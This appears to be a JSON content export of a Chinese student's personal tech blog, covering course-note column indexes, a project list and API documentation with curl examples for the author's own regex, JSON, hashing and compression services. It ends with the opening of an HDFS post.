{"meta":{"title":"Forec's Notes","subtitle":null,"description":"奋斗在Code Farm的在校生","author":"Forec","url":"http://forec.github.io"},"pages":[{"title":"","date":"2017-09-12T15:26:59.000Z","updated":"2016-12-23T17:50:44.000Z","comments":true,"path":"404.html","permalink":"http://forec.github.io/404.html","excerpt":"","text":"Forec / 404 - Not Found body { margin: 0; padding: 0; font-family: \"helvetica neue\", helvetica, arial, sans-serif; font-size: 13px; background: #8dd3d5 url(\"\") repeat-x 0 0; } #background { width: 100%; height: 100%; z-index: 1; margin-top: 15px; } #content { position:absolute; text-align:center; top:55px; width:100%; z-index:3; text-shadow: 0 1px 1px #FFF; min-height: 700px; background: url(\"http://7xktmz.com1.z0.glb.clouddn.com/shoes_hanging.png\") no-repeat 50% 120px; } #logo { position: absolute; z-index: 4; left: 22%; top: 12px;} h1 { color: #363C44; font-size: 32pt; font-weight: bold; line-height: 25px; margin-bottom: 0;} h2, p { color: #64818E; font-size: 15pt; font-weight: normal;} p { font-size: 13pt; } p a, p a:visited, a img { color: #454545; text-decoration: underline; border: none; outline: 0;} 似乎出了些故障 很抱歉，您访问的资源不存在或者已经被移动 返回 Forec 的个人博客， 或 联系我 以告知此问题。"},{"title":"tags","date":"2015-08-04T08:29:41.000Z","updated":"2015-08-04T08:35:40.000Z","comments":false,"path":"tags/index.html","permalink":"http://forec.github.io/tags/index.html","excerpt":"","text":"Test others"},{"title":"个人项目列表","date":"2016-11-05T11:04:22.000Z","updated":"2017-01-31T14:41:24.000Z","comments":false,"path":"projects/index.html","permalink":"http://forec.github.io/projects/index.html","excerpt":"","text":"以下为我托管在 GitHub 上的项目列表，主要为一些练手的小应用，多数使用 C/C++、Python 2.7/3.5 和 Golang 1.7.3 编写。项目列表将持续更新。如果你有任何想法或建议，欢迎来信或提交你的 PR，能获知你的意见是我的荣幸。 The English Version Is Here 在线 API 平台，在我的个人网站 http://forec.cn 上提供一些在线 API 服务。 顶点云存储系统，使用 Golang 1.7.3 编写。它包含一个可供设计基本云存储系统的包，同时将提供一个 Windows 10 版本的客户端。你可以在这里查看我在编写此项目过程中发布的专栏。 顶点云存储 Web 服务，针对 顶点云 设计的 Web 服务器，支持任意浏览器端访问，校内传输速度约 10 MB/s，较顶点云应用程序服务器略慢，在线 Demo：http://cloud.forec.cn。 顶点云设备管理系统，与顶点云属同类产品，提供一站式设备管理平台，最初为 2016 年网络编程作业课程设计，仅针对虚拟设备，目前已支持真实机器的监控和管理，在线 Demo：http://cloud-monitor.forec.cn。 汇编语言基础练习集，收录学习汇编语言过程中解决的习题，你可以向此仓库分享你的代码，或者加入你自己的练习题。 一个 Windows 平台的远程控制软件，提供了基本的图形交互界面，使用 C++ 编写。 简陋的DLL注入工具，使用 C++ 编写。该仓库同时提供了一个 x64 的DLL模板，你可以修改模板为你要注入的 DLL。 北邮校内可使用脚本，包括：自动网关登陆、自动登陆URP并计算GPA等。这些脚本仅可在北京邮电大学校内使用。传送门。 一个 txt 播放器，将一个文件夹中的 txt 文件在终端中播放。你可以使用这个工具将一个视频文件转换为一系列用符号表示的txt文件。传送门。 跨协议视频聊天，同时支持 IPv4 和 IPv6，目前的版本允许跨协议建立连接，即允许两个客户端选择自己要使用的 IP 协议，例如校内用户可以使用 IPv6 和校外的 IPv4 用户建立连接，但需要一个同时支持 IPv4 和 IPv6 的主机部署服务器。 在线视频下载工具，给定视频播放的网页，通过模拟行为获取视频真实链接并下载视频，B 站可行，视频分片传输的网站需手动合并。 端口扫描工具，使用三种语言编写（C++，Python，Golang），性能有差异。 图片为载体的信息读写库，提供了将信息写入图片的接口。 运动检测监控记录工具，一个类似普通监视器管理的程序，三种模式显示给监控者，背景减除容易发现监控异常，检测到运动后开始记录。 马尔科夫链随机语言生成库，使用 Python 2.7 编写，提供了基于给定的训练数据生成中/英文随机文本的接口。 文本共现示例，从普通文本中捕获共现关系并提取为可视化网络。 文件传输工具，使用 Golang 编写，局域网/固定公网IP 可使用。 简陋的信号量算法测试工具，详见 此处。 SYN洪水拒绝服务攻击工具，使用 C++ 基于 Libnet 编写，支持多线程。 项目列表正在持续更新中… 授权声明我已授权实验楼使用以下几个仓库中的代码，并将我编写的对应教程发表在实验楼上。未经实验楼或本人同意，其他机构、媒体一律不得转载、使用教程。 马尔科夫链随机语言生成：教程地址 https://www.shiyanlou.com/courses/678 文本共现网络提取和可视化：教程地址 https://www.shiyanlou.com/courses/677 运动检测监控记录工具：教程地址 https://www.shiyanlou.com/courses/671 局域网视频聊天工具：教程地址 https://www.shiyanlou.com/courses/672"},{"title":"专栏 - 顶点云设计与实现","date":"2016-11-18T11:02:38.000Z","updated":"2017-03-18T13:46:02.000Z","comments":false,"path":"columns/zenith-cloud.html","permalink":"http://forec.github.io/columns/zenith-cloud.html","excerpt":"","text":"此专栏是我对顶点云从设计到编写过程的总结。顶点云的源码（Web 服务器和应用程序）托管在 GitHub 上，顶点云存储的文档可在 此处 查看。 为了区分应用程序服务器和 Web 服务器，以下文章标题均以 “顶点云（应用）” 作为前缀。 应用程序服务器 项目简介 协议设计 传输协议实现和封装 认证基础模块实现 传输、认证单元测试 用户 ADT 设计 服务器逻辑实现 用户代理 文件传输"},{"title":"专栏 - 译文","date":"2017-03-02T08:50:02.000Z","updated":"2017-03-22T03:38:38.000Z","comments":false,"path":"columns/translation.html","permalink":"http://forec.github.io/columns/translation.html","excerpt":"","text":"此专栏中的文章或链接均为我翻译或参与翻译的技术类文章及书籍，最新发布的文章/书籍会出现在专栏最顶部。 从鳄鱼蛋看 λ 演算 Real World Haskell - 第 24 章（并发和多核编程） 三种有用的 monad 图解 Functor, Applicative 和 Monad Real World Haskell - 第 26 章（高级库设计：构建一个布隆过滤器） Real World Haskell - 第 9 章（IO 学习：构建一个用于搜索文件系统的库） Real World Haskell - 第 15 章（使用 Monad 编程） Real World Haskell - 第 4 章（函数式编程）"},{"title":"专栏 - 编程 Tip 和 语言之美","date":"2016-11-18T11:02:38.000Z","updated":"2017-03-18T13:45:20.000Z","comments":false,"path":"columns/languages.html","permalink":"http://forec.github.io/columns/languages.html","excerpt":"","text":"此专栏中的文章涉及一些编程语言特性，以及自己在程序设计中体会到的技巧。最新发布的文章会出现在此专栏的最顶部。 来看几种基本 Monad 用 Haskell 实现解释器 Haskell 中的高效 I/O Haskell 中的非纯粹行为 Haskell 的 fold 系列 Cantor Expansion With Duplicate Elements Fix in Haskell 函数式编程思维笔记 丘奇整数 Golang 的通道技巧 C语言的指针参数 多线程编程 Angry 的编码问题 此专栏正在持续更新中…"},{"title":"专栏","date":"2016-11-05T11:02:38.000Z","updated":"2017-08-22T07:32:58.000Z","comments":false,"path":"columns/index.html","permalink":"http://forec.github.io/columns/index.html","excerpt":"","text":"目前已发布的专栏有： 译文：包括我翻译的技术类文章和书籍 算法与数据结构：包括大部分常见的基础算法、数据结构，提供已验证的代码 计算机理论基础：包括计算机组成原理、操作系统概念等计算机基础理论相关内容 顶点云设计与实现：详述了一个简易云存储系统的编写过程 编程 Tip 和 语言之美：记录我学习到的语言特性和编程技巧 配置记录：记录我配置/编写软件过程中遇到问题的解决方案 大数据/分布式系统：包括有关书籍的读书笔记，以及个人发布的一些介绍性文章 正在持续更新中…"},{"title":"专栏 - 计算机理论基础","date":"2016-11-18T11:02:38.000Z","updated":"2017-03-19T15:24:08.000Z","comments":false,"path":"columns/cs-basic.html","permalink":"http://forec.github.io/columns/cs-basic.html","excerpt":"","text":"此专栏中的内容涉及计算机科学，目前包括形式语言与自动机、计算机组成原理、操作系统概念。 形式语言与自动机此部分使用教材为《形式语言与自动机》（王柏、杨娟编著），北京邮电大学出版社。 形式语言 有限自动机 右线性语言 计算机组成原理和体系结构此部分使用教材为 《The Essentials of Computer Organization and Architecture》 计组与体系结构笔记（一）：基础概念 计组与体系结构笔记（二）：布尔代数和数字逻辑 计组与体系结构笔记（三）：简单体系模型 计组与体系结构笔记（四）：指令系统 计组与体系结构笔记（五）：存储器相关 计组与体系结构笔记（六）：输入/输出与存储系统 操作系统概念此部分使用教材为恐龙书 《Operating System Concepts》 操作系统（一）：概念导读 操作系统（二）：进程与线程 操作系统（三）：CPU 调度 操作系统（四）：进程互斥 操作系统（五）：进程同步 操作系统（六）：管程（Monitor） 操作系统（七）：死锁 操作系统（八）：内存管理 操作系统（九）：虚拟内存 操作系统（十）：文件系统接口 操作系统（十一）：文件系统实现 操作系统（十二）：大容量存储器结构 操作系统（十三）：I/O 输入系统 操作系统（专题）：信号量编程（上） 操作系统（专题）：信号量编程（下） 互斥读者-读者问题 此专栏正在持续更新中…"},{"title":"专栏 - 配置记录","date":"2016-11-18T11:02:38.000Z","updated":"2017-01-31T12:26:48.000Z","comments":false,"path":"columns/configuration.html","permalink":"http://forec.github.io/columns/configuration.html","excerpt":"","text":"此专栏中的文章为我个人配置或编写某些软件过程中遇到过问题的解决方案或操作步骤。 VS Code 配制记录 Hadoop 配置和使用 Spark 集群计算环境配置和使用 Docker 配置策略 CVM操作记录 Raspberry Pi 3 配置索引 Qt mscv2013 解决方案 Linux 各发行版及 Emacs 配置备忘 Windows 10 + Fedora 双系统配置 Python3 操作 Access Database"},{"title":"专栏 - 大数据相关","date":"2016-11-18T11:02:38.000Z","updated":"2017-08-22T07:35:02.000Z","comments":false,"path":"columns/bigdata.html","permalink":"http://forec.github.io/columns/bigdata.html","excerpt":"","text":"此专栏中的文章涉及大数据/分布式系统。 理论 Hadoop 组织及工作 视觉信息论（译） Network Mining Based On Co-occurrence 复杂网络传统社区发现算法概述 机器学习实战 Chapter 1-4 Chapter 5 - Logistic回归 Chapter 6 - 支持向量机 Chapter 7 - AdaBoost元算法 Chapter 8 - 回归 Chapter 9 - 树回归 Chapter 10 - K均值聚类 Chapter 11 - Apriori算法 Chapter 12 - FP-Growth算法 Chapter 13 - PCA简化 Chapter 14 - SVD简化 Chapter 15 - MapReduce 框架 总结"},{"title":"专栏 - 算法与数据结构","date":"2016-11-18T11:02:38.000Z","updated":"2016-11-18T13:26:44.000Z","comments":false,"path":"columns/algorithms.html","permalink":"http://forec.github.io/columns/algorithms.html","excerpt":"","text":"此专栏中的文章均以算法与数据结构为中心，按从基础到进阶的顺序排列。 基础数据结构（需求和树相关） 基础数据结构（散列和优先队列） 部分问题例程 排序和字符串匹配 LCA和RSA 图的概念和存储方式 图的遍历和拓扑排序 最小生成树和最小树形图 最短路径 差分约束系统 强连通分量 最大流"},{"title":"categories","date":"2015-08-04T08:37:43.000Z","updated":"2015-08-05T00:31:14.000Z","comments":false,"path":"categories/index.html","permalink":"http://forec.github.io/categories/index.html","excerpt":"","text":""},{"title":"API 服务 - 正则模式","date":"2017-08-26T13:05:42.000Z","updated":"2017-08-26T14:45:00.000Z","comments":false,"path":"apis/regexp.html","permalink":"http://forec.github.io/apis/regexp.html","excerpt":"","text":"此页面是 正则模式 对应的 API 说明，你可以查看 索引 来寻找需要的 API。 Regexp Mode For English Version Is HereIndex For English Version Is Here 正则模式下 API 需要如下参数: plain（可选）：你想要搜索/匹配的文本，默认为空 pattern（可选）:你想要匹配/搜索的正则表达式，默认为空 method（可选）：你想要使用的匹配方法，默认为 match count（可选）：仅在使用 findSome 方法时需要此参数，该方法会在 plain 中搜索所有与 pattern 匹配的子串，并且取这个列表的前 count 项返回。若不指定 count 或 count 字段无法被解析为数字，将会默认令 count 为 -1，此时效果与 findAll 相同。 可用方法可使用的方法如下，大/小写不影响。 match：若 plain 和 pattern 匹配成功则返回 plain 字段，状态码为 200；否则返回空串，状态码为 300。 find：若在 plain 中搜索到与 pattern 匹配的子串，则返回第一个搜索到的子串，状态码为 200；否则返回空串，状态码为 300。 findindex：若在 plain 中搜索到与 pattern 匹配的子串，则以字符串形式返回第一个搜索到的子串的起始下标和结束下表，中间用逗号分隔，状态码为 200；否则返回空串，状态码为 300。 findall：在 plain 中搜索到与 pattern 匹配的子串，返回所有匹配子串的集合，状态码为 200；否则返回空集合，状态码为 300。 findsome：在 plain 中搜索到与 pattern 匹配的子串，将匹配子串的前 count 项作为一个集合返回，状态码为 200；否则返回空集合，状态码为 300。 12345678910&gt; curl http://api.forec.cn/regexp?plain=peach&amp;pattern=pe.ch&#123;\"code\":200,\"result\":\"peach\"&#125;&gt; curl http://api.forec.cn/regexp?plain=peach&amp;pattern=pe.ch&amp;method=find&#123;\"code\":200,\"result\":\"peach\"&#125;&gt; curl http://api.forec.cn/regexp?plain=peach&amp;pattern=pe.ch&amp;method=findIndex&#123;\"code\":200,\"result\":\"0,5\"&#125;&gt; curl http://api.forec.cn/regexp?plain=peach&amp;pattern=pe.ch&amp;method=findall&#123;\"code\":200,\"result\":\"&#123;\\\"peach\\\"&#125;\"&#125;&gt; curl http://api.forec.cn/regexp?plain=p1e2a3c4h&amp;pattern=\\d&amp;method=findsome&amp;count=2&#123;\"code\":200,\"result\":\"&#123;\\\"1\\\", \\\"2\\\"&#125;\"&#125;"},{"title":"API 服务 - JSON 模式","date":"2016-11-26T11:02:38.000Z","updated":"2017-08-26T09:57:36.000Z","comments":false,"path":"apis/json.html","permalink":"http://forec.github.io/apis/json.html","excerpt":"","text":"此页面是 JSON 模式 对应的 API 说明，你可以查看 索引 来寻找需要的 API。 Crypto Mode For English Version Is HereIndex For English Version Is Here JSON JSON 类 API 请求的前缀为 http://api.forec.cn/json，你可以使用 GET 或 POST 方式传递数据。 此模式提供对 JSON 格式数据的解析服务，服务器将对针对你的请求返回 纯文本 格式的数据。 此 API 可指定以下字段: json （必选）：待解析的 JSON 格式字符串 key （可选）：要获取的值对应的键 type （可选）：要获取的值的类型 key 字段 默认情况下，服务器会直接以字符串格式返回 JSON 格式中 key 键对应的内容。 如果 JSON 字符串中不包含 key 指定的键，则服务器将返回 null。 如果 key 没有被设定，服务器会直接返回原始的 JSON 字符串。 123456&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":\"&#123;1:2,3:4&#125;\"&#125;&#125;&#125;&amp;key=test1&#123;\"test2\":&#123;\"test3\":\"&#123;1:2,3:4&#125;\"&#125;&#125;&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":\"&#123;1:2,3:4&#125;\"&#125;&#125;&#125;&amp;key=testnull&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":\"&#123;1:2,3:4&#125;\"&#125;&#125;&#125;&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":\"&#123;1:2,3:4&#125;\"&#125;&#125;&#125; key 字段也可以是一个通过 : 划分的列表。在上面的例子中，如果你想获取 test3 键对应的值，则可以将 key 字段设置为 test1:test2:test3。 12&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":\"&#123;1:2,3:4&#125;\"&#125;&#125;&#125;&amp;key=test1:test2:test3\"&#123;1:2,3:4&#125;\" type 字段 你可以 指定 type 字段来实现类型检查 。默认情况下，如果你没有指定 type，服务器会以字符串格式返回键对应的值。如果你设置了 type 字段，则服务器会尝试将值解析为你指定的 type 格式。如果解析成功，服务器会按照该格式通用的方式转换为字符串并返回；如果无法将值解析为 type 格式，则服务器返回 null。 type 字段可以是如下类型之一，大小写不敏感。如果 type 字段不是如下类型，则将默认被视作 default 格式: int float bool string stringarray array map default（和不设置 type 字段相同） int、float 和 bool 类型会将值以纯字符串格式返回。如果你能保证值的类型，那么你可以不设置 type 字段以忽视类型检查。如果类型检查成功，则这三种格式在设定 type 和 default 模式下的返回结果相同，否则服务器返回 null。 1234567891011121314&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":123&#125;&#125;&#125;&amp;key=test1:test2:test3123&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":123&#125;&#125;&#125;&amp;key=test1:test2:test3&amp;type=int123&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":123.321&#125;&#125;&#125;&amp;key=test1:test2:test3&amp;type=intnull&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":123&#125;&#125;&#125;&amp;key=test1:test2:test3&amp;type=float123.000000&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":123.321&#125;&#125;&#125;&amp;key=test1:test2:test3&amp;type=float123.321000&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":true&#125;&#125;&#125;&amp;key=test1:test2:test3&amp;type=booltrue&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":123&#125;&#125;&#125;&amp;key=test1:test2:test3&amp;type=boolnull 如果你确定值的类型是字符串，你可以指定类型为 string。注意 string 格式和默认模式的返回值有一点差别，string 格式返回时不包括外围的引号。 123456&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":teststring&#125;&#125;&#125;&amp;key=test1:test2:test3&amp;type=stringnull&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":\"teststring\"&#125;&#125;&#125;&amp;key=test1:test2:test3&amp;type=stringteststring&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":\"teststring\"&#125;&#125;&#125;&amp;key=test1:test2:test3\"teststring\" stringarray 是一个字符串列表，下面的例子展示了 stringarray 模式和默认模式的差别。 12345&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":[\"test\", \"testarray\"]&#125;&#125;&#125; &amp;key=test1:test2:test3&amp;type=stringarray[test,testarray]&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":[\"test\", \"testarray\"]&#125;&#125;&#125;&amp;key=test1:test2:test3[\"test\",\"testarray\"] array 和 map 的返回结果和默认模式类似，但服务器会先对值做类型检查。如果值无法被映射为列表或字典，则服务器返回 null，否则以字符串格式返回，但不包括外围引号。 12345678&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":\"[1,2,3]\"&#125;&#125;&#125;&amp;key=test1:test2:test3&amp;type=array[1,2,3]&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":\"[1,2,3]\"&#125;&#125;&#125;&amp;key=test1:test2:test3\"[1,2,3]\"&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":\"2:[1,2,3]\"&#125;&#125;&#125;&amp;key=test1:test2:test3&amp;type=map2:[1,2,3]&gt; curl http://api.forec.cn/json?json=&#123;\"test1\":&#123;\"test2\":&#123;\"test3\":\"2:[1,2,3]\"&#125;&#125;&#125;&amp;key=test1:test2:test3\"2:[1,2,3]\""},{"title":"个人网站 API 服务","date":"2016-11-26T11:02:38.000Z","updated":"2017-08-26T14:46:58.000Z","comments":false,"path":"apis/index.html","permalink":"http://forec.github.io/apis/index.html","excerpt":"","text":"此页面是对我个人网站（http://forec.cn）提供的在线 API 所做的说明，所有 API 和服务器的源码托管在我的 GitHub 仓库上。API 请求的前缀均为 http://api.forec.cn。 English Version Is Here 导航 压缩模式 密文模式 JSON 模式 正则模式 功能正在更新中…"},{"title":"API 服务 - 密文模式","date":"2016-11-26T11:02:38.000Z","updated":"2017-01-11T10:50:00.000Z","comments":false,"path":"apis/crypto.html","permalink":"http://forec.github.io/apis/crypto.html","excerpt":"","text":"此页面是 密文模式 对应的 API 说明，你可以查看 索引 来寻找需要的 API。 Crypto Mode For English Version Is HereIndex For English Version Is Here 密文 密文类 API 请求的前缀为 http://api.forec.cn/crypto，你可以使用 GET 或 POST 方式传递数据。 此模式目前可以提供如下类型密文格式： md5 sha1 sha224 sha256 sha384 sha512 sha512_224 sha512_256 服务器将对针对你的请求返回 JSON 格式的数据，包含两个字段：Code 说明了你的请求是否合法以及返回值是否正确，Result 字段为服务器针对你的数据返回的加密/解密结果。其中 Code 可为如下四种指令字： 200：成功解密，返回值正确 300：成功加密，返回值正确 400：你的请求所包含的数据不合法 500：服务器内部错误 密文类请求均需要指定两个字段： method=密文格式：指定 method 来告知服务器你要使用的密文格式 plain=待加密文本：此字段放置你要加密的字节串 cipher=待解密字节串：此字段放置你要解密的字节串 plain 和 cipher 字段不应同时被指定，否则服务器会默认忽视 cipher 字段 注意，因为服务器会自动使用 UTF-8 格式为 JSON 数据编码，故接收到的结果如果包含 ASCII 以外字符需要使用 UTF-8 格式解码。 MD5 格式 你需要指定 method 类型为 md5 或 MD5。因为 MD5 无法逆向求解，因此此格式不支持 cipher 字段，如果你指定了该字段，服务器会自动忽略。 MD5 格式有两个可选字段： bits=结果长度：指定返回结果的长度，默认为 32 字节。你可以将其指定为 16。如果你将此字段设定为 16 和 32 以外的数值或非法格式，服务器将默认长度为 32。 format=大小写：此字段可以为 U 或 L。默认返回结果中的字母为大写，你可以将此字段设为 L 来获得小写格式。如果你将此字段设为 L 和 U 以外的任何值，服务器将默认使用大写格式。 样例： 123456&gt; curl http://api.forec.cn/crypto?method=md5&amp;plain=test&#123;\"code\":300,\"result\":\"098F6BCD4621D373CADE4E832627B4F6\"&#125;&gt; curl http://api.forec.cn/crypto?method=md5&amp;plain=test&amp;format=L&#123;\"code\":300,\"result\":\"098f6bcd4621d373cade4e832627b4f6\"&#125;&gt; curl http://api.forec.cn/crypto?method=md5&amp;plain=test&amp;bits=16&amp;format=L&#123;\"code\":300,\"result\":\"4621d373cade4e83\"&#125; SHA 系列格式 你需要指定 method 类型为 sha* 或 SHA*，这里的 * 是 SHA 格式的版本。因为 SHA 无法逆向求解，因此此格式不支持 cipher 字段，如果你指定了该字段，服务器会自动忽略。 可使用的格式有： method=sha1 method=sha224 method=sha256 method=sha384 method=sha512 method=sha512_224 method=sha512_256 SHA 类型有一个可选字段：format=大小写，此字段可以为 U 或 L。默认返回结果中的字母为大写，你可以将此字段设为 L 来获得小写格式。如果你将此字段设为 L 和 U 以外的任何值，服务器将默认使用大写格式。 样例： 12345678910111213141516&gt; curl http://api.forec.cn/crypto?method=sha1&amp;plain=testthismessage&amp;format=L&#123;\"code\":300,\"result\":\"fa715c9065385cc3acdeb93a7b66583fdf06a5b6\"&#125;&gt; curl http://api.forec.cn/crypto?method=sha224&amp;plain=testthismessage&amp;format=L&#123;\"code\":300,\"result\":\"a08d72e16ab5b7f92eb09c35fa351778ca2dbfe5faa9b5088d8ef421\"&#125;&gt; curl http://api.forec.cn/crypto?method=sha256&amp;plain=testthismessage&amp;format=L&#123;\"code\":300,\"result\":\"dca92fb06a35f32078ff400c7bb33f8994ba4b2792d12eb2de4507096ae80b08\"&#125;&gt; curl http://api.forec.cn/crypto?method=sha384&amp;plain=testthismessage&amp;format=L&#123;\"code\":300,\"result\":\"00924267b607f6fac3de0174a32af14bb420f85b65c8fb4c1 3801f337bab6682d5dbbd1d5bde1d6842bcdff01ec15117\"&#125;&gt; curl http://api.forec.cn/crypto?method=sha512&amp;plain=testthismessage&amp;format=L&#123;\"code\":300,\"result\":\"90d8971c2b70b32dd24e04f3e114f5268bc10f9621df4960c ccc0e3bdc5d74c1e631a1110fabe24cb65d249e17b9119b319e2e2600a6a39987e576c5d86e8dde\"&#125;&gt; curl http://api.forec.cn/crypto?method=sha512_224&amp;plain=testthismessage&amp;format=L&#123;\"code\":300,\"result\":\"b2d961fa6d7f718ee8336ccbd3d60c030128dc2bf9edb8da92afdbb1\"&#125;&gt; curl http://api.forec.cn/crypto?method=sha512_256&amp;plain=testthismessage&amp;format=L&#123;\"code\":300,\"result\":\"993e73b7f67bb26cd796833ce5fa21c35b1e55e4b763d6e7982f33cf0fcac593\"&#125;"},{"title":"API 服务 - 压缩模式","date":"2016-11-26T11:02:38.000Z","updated":"2017-01-11T10:49:50.000Z","comments":false,"path":"apis/compression.html","permalink":"http://forec.github.io/apis/compression.html","excerpt":"","text":"此页面是 压缩模式 对应的 API 说明，你可以查看 索引 来寻找需要的 API。 Compression Mode For English Version Is HereIndex For English Version Is Here 压缩 压缩类 API 请求的前缀为 http://api.forec.cn/compress，你可以使用 GET 或 POST 方式传递数据。 此模式目前可以提供如下类型压缩格式： gzip bzip2 zlib base32 base64 服务器将对针对你的请求返回 JSON 格式的数据，包含两个字段：Code 说明了你的请求是否合法以及返回值是否正确，Result 字段为服务器针对你的数据返回的压缩/解压结果。其中 Code 可为如下四种指令字： 200：成功解压，返回值正确 300：成功压缩，返回值正确 400：你的请求所包含的数据不合法 500：服务器内部错误 压缩类请求均需要指定至少两个字段： method=压缩格式：指定 method 来告知服务器你要使用的压缩格式 plain=待压缩文本：此字段放置你要压缩的字节串 cipher=待解压文本：此字段放置你要解压的字节串 plain 和 cipher 字段不应同时被指定，否则服务器会默认忽视 cipher 字段 注意，因为服务器会自动使用 UTF-8 格式为 JSON 数据编码，故接收到的结果需要使用 UTF-8 格式解码。 对于 GZIP 格式和 ZLIB 格式，你可以制定一个额外的选项 level 来改变压缩等级： level 应当是一个 1 到 9 之间的整数，数值越大则压缩质量越高 level 可以为 0，此时服务器将不会压缩数据，并将原数据放到 Result 字段返回 level 可以为 -1，如果你不指定 level 字段，服务器会默认将其置为 -1。通常情况下 -1 也会使用最高级别的压缩质量。 GZIP 格式 你需要指定 method 类型为 gzip 或 GZIP。 因为我们的测试字段过短（”test”），因此压缩后的主体没有区别，但可以看出两个样例头部的不同（\\u0000 和 \\u0004）区分了压缩质量。 样例： 123456&gt; curl http://api.forec.cn/compress?method=gzip&amp;plain=test&#123;\"code\":300,\"result\":\"\\u001f\\ufffd\\u0008\\u0000\\u0000\\tn \\ufffd\\u0000\\ufffd*I-.\\u0001\\u0000\\u0000\\u0000\\ufffd\\ufffd\"&#125;&gt; curl http://api.forec.cn/compress?method=gzip&amp;plain=test&amp;level=1&#123;\"code\":300,\"result\":\"\\u001f\\ufffd\\u0008\\u0000\\u0000\\tn \\ufffd\\u0004\\ufffd*I-.\\u0001\\u0000\\u0000\\u0000\\ufffd\\ufffd\"&#125; BZIP2 你需要指定 method 类型为 zlib 或 ZLIB。 在 BZIP2 模式中，level 如果被设置为小于 0 或高于 9 的值，则将自动被转换为 9（质量最高）。 样例： 123456&gt; curl http://api.forec.cn/compress?method=bzip2&amp;plain=test&#123;\"code\":300,\"result\":\"BZh91AY\\u0026SY3\\ufffdϬ\\u0000\\u0000\\u0001 \\u0001\\ufffd\\u0002\\u0000\\u000c\\u0000 \\u0000 \\ufffd&#123;P5\\u001e\\ufffdz\"&#125;&gt; curl http://api.forec.cn/compress?method=bzip2&amp;plain=test&amp;level=1&#123;\"code\":300,\"result\":\"BZh11AY\\u0026SY3\\ufffdϬ\\u0000\\u0000\\u0001 \\u0001\\ufffd\\u0002\\u0000\\u000c\\u0000 \\u0000 \\ufffd&#123;P5\\u001e\\ufffdz\"&#125; ZLIB 格式 你需要指定 method 类型为 zlib 或 ZLIB。 样例： 1234&gt; curl http://api.forec.cn/compress?method=zlib&amp;plain=test&#123;\"code\":300,\"result\":\"x\\ufffd*I-.\\u0001\\u0004\\u0000\\u0000\\ufffd\\ufffd\\u0004]\\u0001\\ufffd\"&#125;&gt; curl http://api.forec.cn/compress?method=zlib&amp;plain=test&amp;level=1&#123;\"code\":300,\"result\":\"x\\u0001*I-.\\u0001\\u0004\\u0000\\u0000\\ufffd\\ufffd\\u0004]\\u0001\\ufffd\"&#125; BASE32 格式 你需要指定 method 类型为 base32 或 BASE32。 样例： 1234&gt; curl http://api.forec.cn/compress?method=base32&amp;plain=test&#123;\"code\":300,\"result\":\"ORSXG5A=\"&#125;&gt; curl http://api.forec.cn/compress?method=base32&amp;cipher=ORSXG5A=&#123;\"code\":200,\"result\":\"test\"&#125; BASE64 格式 你需要指定 method 类型为 base64 或 BASE64。 样例： 1234&gt; curl http://api.forec.cn/compress?method=base64&amp;plain=test&#123;\"code\":300,\"result\":\"dGVzdA==\"&#125;&gt; curl http://api.forec.cn/compress?method=base64&amp;cipher=dGVzdA==&#123;\"code\":200,\"result\":\"test\"&#125;"},{"title":"关于我","date":"2015-08-04T08:22:41.000Z","updated":"2018-07-19T02:25:37.435Z","comments":false,"path":"about/index.html","permalink":"http://forec.github.io/about/index.html","excerpt":"","text":"Forec 的官方网站：http://forec.cn 在建中 网站备案号：京ICP备16060806号-1 目前为 清华大学，计算机科学与技术系，2018 级学术型硕士研究生 邮箱：forect(at)hotmail(dot)com 个人项目列表：中文版 English Github：https://github.com/Forec CodeWars：https://www.codewars.com/users/Forec LeetCode: https://leetcode.com/forec Zhihu：https://www.zhihu.com/people/forect Facebook：https://www.facebook.com/MrForec Twitter：https://twitter.com/MrForec"}],"posts":[{"title":"HDFS 组织及工作","slug":"hadoop_knowledge","date":"2017-08-22T08:16:16.000Z","updated":"2017-08-22T07:37:46.000Z","comments":true,"path":"2017/08/22/hadoop_knowledge/","link":"","permalink":"http://forec.github.io/2017/08/22/hadoop_knowledge/","excerpt":"Apache Hadoop 是一款支持数据密集型分布式应用程序并以 Apache 2.0 许可协议发布的开源软件框架。它支持在商品硬件构建的大型集群上运行的应用程序。Hadoop 是根据谷歌公司发表的 MapReduce 和 Google 文件系统的论文自行实现而成。所有的 Hadoop 模块都有一个基本假设，即硬件故障是常见情况，应该由框架自动处理。","text":"Apache Hadoop 是一款支持数据密集型分布式应用程序并以 Apache 2.0 许可协议发布的开源软件框架。它支持在商品硬件构建的大型集群上运行的应用程序。Hadoop 是根据谷歌公司发表的 MapReduce 和 Google 文件系统的论文自行实现而成。所有的 Hadoop 模块都有一个基本假设，即硬件故障是常见情况，应该由框架自动处理。 子项目 Hadoop Common：在 0.20 及以前的版本中，包含 